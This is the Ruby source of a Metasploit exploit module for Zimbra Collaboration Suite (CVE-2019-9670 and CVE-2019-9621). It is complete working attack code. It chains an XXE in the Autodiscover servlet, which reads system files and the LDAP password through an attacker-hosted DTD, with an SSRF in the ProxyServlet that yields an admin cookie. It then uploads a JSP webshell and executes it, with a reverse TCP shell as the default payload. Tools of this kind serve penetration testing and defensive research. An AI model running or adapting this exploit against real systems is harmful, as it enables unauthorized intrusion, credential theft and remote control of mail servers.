# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HttpServer
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Zimbra Collaboration Autodiscover Servlet XXE and ProxyServlet SSRF&#039;,
      &#039;Description&#039;    => %q{
        This module exploits an XML external entity vulnerability and a
        server side request forgery to get unauthenticated code execution
        on Zimbra Collaboration Suite. The XML external entity vulnerability
        in the Autodiscover Servlet is used to read a Zimbra configuration
        file that contains an LDAP password for the &#039;zimbra&#039; account. The
        zimbra credentials are then used to get a user authentication cookie
        with an AuthRequest message. Using the user cookie, a server side request
        forgery in the Proxy Servlet is used to proxy an AuthRequest with
        the &#039;zimbra&#039; credentials to the admin port to retrieve an admin
        cookie. After gaining an admin cookie the Client Upload servlet is
        used to upload a JSP webshell that can be triggered from the web
        server to get command execution on the host. The issues reportedly
        affect Zimbra Collaboration Suite v8.5 to v8.7.11.

        This module was tested with Zimbra Release 8.7.1.GA.1670.UBUNTU16.64
        UBUNTU16_64 FOSS edition.
      },
      &#039;Author&#039;         =>
        [
          &#039;An Trinh&#039;,         # Discovery
          &#039;Khanh Viet Pham&#039;,  # Discovery
          &#039;Jacob Robles&#039;      # Metasploit module
        ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     =>
        [
          [&#039;CVE&#039;, &#039;2019-9670&#039;],
          [&#039;CVE&#039;, &#039;2019-9621&#039;],
          [&#039;URL&#039;, &#039;https://blog.tint0.com/2019/03/a-saga-of-code-executions-on-zimbra.html&#039;]
        ],
      &#039;Platform&#039;       => [&#039;linux&#039;],
      &#039;Arch&#039;           => ARCH_JAVA,
      &#039;Targets&#039;        =>
        [
          [ &#039;Automatic&#039;, { } ]
        ],
      &#039;DefaultOptions&#039; => {
        &#039;RPORT&#039; => 8443,
        &#039;SSL&#039; => true,
        &#039;PAYLOAD&#039; => &#039;java/jsp_shell_reverse_tcp&#039;
      },
      &#039;Stance&#039;         => Stance::Aggressive,
      &#039;DefaultTarget&#039;  => 0,
      &#039;DisclosureDate&#039; => &#039;2019-03-13&#039; # Blog post date
    ))

    register_options [
      OptString.new(&#039;TARGETURI&#039;, [true, &#039;Zimbra application base path&#039;, &#039;/&#039;]),
      OptInt.new(&#039;HTTPDELAY&#039;, [true, &#039;Number of seconds the web server will wait before termination&#039;, 10])
    ]
  end

  def xxe_req(data)
    res = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039; => normalize_uri(target_uri, &#039;/autodiscover&#039;),
      &#039;encode_params&#039; => false,
      &#039;data&#039; => data
    })
    fail_with(Failure::Unknown, &#039;Request failed&#039;) unless res && res.code == 503
    res
  end

  def soap_discover(check_soap=false)
    xml = REXML::Document.new

    xml.add_element(&#039;Autodiscover&#039;)
    xml.root.add_element(&#039;Request&#039;)

    req = xml.root.elements[1]

    req.add_element(&#039;EMailAddress&#039;)
    req.add_element(&#039;AcceptableResponseSchema&#039;)

    replace_text = &#039;REPLACE&#039;
    req.elements[&#039;EMailAddress&#039;].text = Faker::Internet.email
    req.elements[&#039;AcceptableResponseSchema&#039;].text = replace_text

    doc = rand_text_alpha_lower(4..8)
    entity = rand_text_alpha_lower(4..8)
    local_file = &#039;/etc/passwd&#039;

    res = "<!DOCTYPE #{doc} [<!ELEMENT #{doc} ANY>"
    if check_soap
      local = "file://#{local_file}"
      res << "<!ENTITY #{entity} SYSTEM &#039;#{local}&#039;>]>"
      res << "#{xml.to_s.sub(replace_text, "&#{entity};")}"
    else
      local = "http://#{srvhost_addr}:#{srvport}#{@service_path}"
      res << "<!ENTITY % #{entity} SYSTEM &#039;#{local}&#039;>"
      res << "%#{entity};]>"
      res << "#{xml.to_s.sub(replace_text, "&#{@ent_data};")}"
    end
    res
  end

  def soap_auth(zimbra_user, zimbra_pass, admin=true)
    urn = admin ? &#039;urn:zimbraAdmin&#039; : &#039;urn:zimbraAccount&#039;
    xml = REXML::Document.new

    xml.add_element(
      &#039;soap:Envelope&#039;,
      {&#039;xmlns:soap&#039;  => &#039;http://www.w3.org/2003/05/soap-envelope&#039;}
    )

    xml.root.add_element(&#039;soap:Body&#039;)
    body = xml.root.elements[1]
    body.add_element(
      &#039;AuthRequest&#039;,
      {&#039;xmlns&#039; => urn}
    )

    zimbra_acc = body.elements[1]
    zimbra_acc.add_element(
      &#039;account&#039;,
      {&#039;by&#039; => &#039;adminName&#039;}
    )
    zimbra_acc.add_element(&#039;password&#039;)

    zimbra_acc.elements[&#039;account&#039;].text  = zimbra_user
    zimbra_acc.elements[&#039;password&#039;].text = zimbra_pass

    xml.to_s
  end

  def cookie_req(data)
    res = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039; => normalize_uri(target_uri, &#039;/service/soap/&#039;),
      &#039;data&#039; => data
    })
    fail_with(Failure::Unknown, &#039;Request failed&#039;) unless res && res.code == 200
    res
  end

  def proxy_req(data, auth_cookie)
    target = "https://127.0.0.1:7071#{normalize_uri(target_uri, &#039;/service/admin/soap/AuthRequest&#039;)}"
    res = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039; => normalize_uri(target_uri, &#039;/service/proxy/&#039;),
      &#039;vars_get&#039; => {&#039;target&#039; => target},
      &#039;cookie&#039; => "ZM_ADMIN_AUTH_TOKEN=#{auth_cookie}",
      &#039;data&#039; => data,
      &#039;headers&#039; => {&#039;Host&#039; => "#{datastore[&#039;RHOST&#039;]}:7071"}
    })
    fail_with(Failure::Unknown, &#039;Request failed&#039;) unless res && res.code == 200
    res
  end

  def upload_file(file_name, contents, cookie)
    data = Rex::MIME::Message.new
    data.add_part(file_name, nil, nil, &#039;form-data; name="filename1"&#039;)
    data.add_part(contents, &#039;application/octet-stream&#039;, nil, "form-data; name=\"clientFile\"; filename=\"#{file_name}\"")
    data.add_part("#{rand_text_numeric(2..5)}", nil, nil, &#039;form-data; name="requestId"&#039;)
    post_data = data.to_s

    send_request_cgi({
      &#039;method&#039;          => &#039;POST&#039;,
      &#039;uri&#039;             => normalize_uri(target_uri, &#039;/service/extension/clientUploader/upload&#039;),
      &#039;ctype&#039;           => "multipart/form-data; boundary=#{data.bound}",
      &#039;data&#039;            => post_data,
      &#039;cookie&#039;          => cookie
    })
  end

  def check
    begin
      res = xxe_req(soap_discover(true))
    rescue Msf::Exploit::Failed
      return CheckCode::Unknown
    end

    if res.body.include?(&#039;zimbra&#039;)
      return CheckCode::Vulnerable
    end

    CheckCode::Unknown
  end

  def on_request_uri(cli, req)
    ent_file = rand_text_alpha_lower(4..8)
    ent_eval = rand_text_alpha_lower(4..8)

    dtd =  <<~HERE
    <!ENTITY % #{ent_file} SYSTEM "file:///opt/zimbra/conf/localconfig.xml">
    <!ENTITY % #{ent_eval} "<!ENTITY #{@ent_data} &#039;<![CDATA[%#{ent_file};]]>&#039;>">
    %#{ent_eval};
    HERE
    send_response(cli, dtd)
  end

  def primer
    datastore[&#039;SSL&#039;] = @ssl
    res = xxe_req(soap_discover)
    fail_with(Failure::UnexpectedReply, &#039;Password not found&#039;) unless res.body =~ /ldap_password.*?value>(.*?)<\/value/m
    password = $1
    username = &#039;zimbra&#039;

    print_good("Password found: #{password}")

    data = soap_auth(username, password, false)
    res = cookie_req(data)

    fail_with(Failure::NoAccess, &#039;Failed to authenticate&#039;) unless res.get_cookies =~ /ZM_AUTH_TOKEN=([^;]+;)/
    auth_cookie = $1

    print_good("User cookie retrieved: ZM_AUTH_TOKEN=#{auth_cookie}")

    data = soap_auth(username, password)
    res = proxy_req(data, auth_cookie)

    fail_with(Failure::NoAccess, &#039;Failed to authenticate&#039;) unless res.get_cookies =~ /(ZM_ADMIN_AUTH_TOKEN=[^;]+;)/
    admin_cookie = $1

    print_good("Admin cookie retrieved: #{admin_cookie}")

    stager_name = "#{rand_text_alpha(8..16)}.jsp"
    print_status(&#039;Uploading jsp shell&#039;)
    res = upload_file(stager_name, payload.encoded, admin_cookie)

    fail_with(Failure::Unknown, "#{peer} - Unable to upload stager") unless res && res.code == 200
    # Only shell sessions are supported
    register_file_for_cleanup("$(find /opt/zimbra/ -regex &#039;.*downloads/.*#{stager_name}&#039; -type f)")
    register_file_for_cleanup("$(find /opt/zimbra/ -regex &#039;.*downloads/.*#{stager_name[0...-4]}.*1StreamConnector.class&#039; -type f)")
    register_file_for_cleanup("$(find /opt/zimbra/ -regex &#039;.*downloads/.*#{stager_name[0...-4]}.*class&#039; -type f)")
    register_file_for_cleanup("$(find /opt/zimbra/ -regex &#039;.*downloads/.*#{stager_name[0...-4]}.*java&#039; -type f)")

    print_status("Executing payload on /downloads/#{stager_name}")
    res = send_request_cgi({
      &#039;uri&#039;             => normalize_uri(target_uri, "/downloads/#{stager_name}"),
      &#039;cookie&#039;          => admin_cookie
    })
  end

  def exploit
    @ent_data = rand_text_alpha_lower(4..8)
    @ssl = datastore[&#039;SSL&#039;]
    datastore[&#039;SSL&#039;] = false
    Timeout.timeout(datastore[&#039;HTTPDELAY&#039;]) { super }
  rescue Timeout::Error
  end
end

